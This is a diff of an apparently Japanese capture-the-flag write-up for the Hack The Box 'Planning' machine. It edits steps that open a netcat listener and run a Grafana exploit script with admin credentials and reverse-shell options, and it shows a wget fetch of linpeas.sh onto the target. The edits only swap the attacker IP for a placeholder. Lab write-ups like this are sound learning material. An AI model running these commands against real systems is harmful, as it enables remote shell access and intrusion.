@@ -93,7 +93,8 @@ nc -lvnp 1234
 
 その後、以下のoptionで```poc.py```スクリプトを実行
 ```
-python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.16.3 --reverse-port 1234 
+# 10.10.XX.XXは自分のip
+python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.XX.XX --reverse-port 1234 
 ```
 
 ###　Environment
@@ -152,7 +153,6 @@ python3 -m http.server 8080
 これでHTTP Serverが開くので
 targetマシン上で
 ```
-# 10.10.XX.XXは自分のip
 wget http://10.10.XX.XX:8080/linpeas.sh
 ```
 で持ってきて
